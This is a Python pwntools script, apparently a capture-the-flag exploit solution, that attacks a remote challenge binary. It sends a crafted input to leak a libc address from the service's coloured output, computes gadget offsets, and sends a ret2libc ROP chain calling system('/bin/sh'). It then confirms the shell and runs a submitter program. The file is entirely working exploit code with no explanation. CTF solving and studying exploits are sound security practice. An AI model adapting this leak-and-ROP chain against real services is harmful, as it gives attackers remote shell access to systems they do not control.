from pwn import *
import os
#from hexdump import hexdump

#env = os.environ.copy()
#env['LD_PRELOAD'] = os.path.join(os.getcwd(), './libc.so.6')
#p = process("./challenge", env=env)

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, PORT)
#p = gdb.debug("./challenge", aslr=True)
#gdb.attach(p)

p.sendlineafter(b"be?", b"10")
p.sendlineafter(b'get?', b'7')

dummy = b'ABCDEFGHI' + p8(0x74)
p.sendafter(b'?\n', dummy)

second_len = 0x52 + 0x18 - 2 + 0x18
dummy_single = b'\x00' + b'A' * 9
xx = p8(second_len) + b'A' * 9
payload = b'A' * 9 + b'\xff' + b'A' * 9 + dummy_single * 3 + xx + dummy_single + \
    p8(7) + \
    b'Z' * 22 + \
    p32(0x41414141) + \
    b'AAA' + \
    p8(0) + \
    p32(0x41414141) + \
    b'AAA' + \
    b'A'
payload += p32(len(payload))
payload += p32(4)

assert len(payload) == 0x74

p.recvuntil(b'#2?\n')
p.send(payload)

def check(payload):
  assert b'\x09' not in payload
  assert b'\x0a' not in payload
  assert b'\x0b' not in payload
  assert b'\x0c' not in payload
  assert b'\x0d' not in payload 

#context.log_level = 'DEBUG'

# leak
def read_garbage():
  b = p.recvn(4)
  assert b[0] == 0x1b
  if b == b'\x1b[1;':
    p.recvn(7)
  elif b == b'\x1b[0m':
    p.recvn(1)
  char = p.recvn(1)
  p.recvn(1)
  return char

def readn_garbage(n):
  by = b''
  for _ in range(n):
    by += read_garbage()
  p.recvline()
  return by

readn_garbage(10)
readn_garbage(0x74)

leak = readn_garbage(0xff)[0xa:]
#hexdump(leak[0xa:])
libc = u64(leak[0x78:0x80]) - 0x29d90
log.info("Libc = " + hex(libc))
assert libc & 0xFFF == 0

poprdi = libc + 0x000000000002a3e5
ret = poprdi + 1
system = libc + 0x508F0
binsh = libc + 0x1d8698

payload = b'A' * 9 + b'\x00' + b'A' * 9 + b'\x00' + b'Z' * 22 + \
    p32(0x41414141) + b'AAA' + \
    p8(0) + \
    p32(0x41414141) + \
    b'AAA' + \
    b'A'
payload += p32(len(payload))
payload += p32(6)
payload += b'A' * 0xe
payload += p64(ret) + p64(poprdi) + p64(binsh) + p64(system) + b'C' * 0x10
#payload += p64(poprdi) + p64(binsh) + p64(system)
#payload += p64(0x4141414141414141)

assert len(payload) == second_len
check(payload)
p.recvuntil(b'#7?\n')
p.send(payload)

p.sendline(b'AAA')
p.sendline(b'echo hello')
p.recvuntil(b'hello\n')

p.sendline(b'./submitter')
print(p.recvline())

p.close()
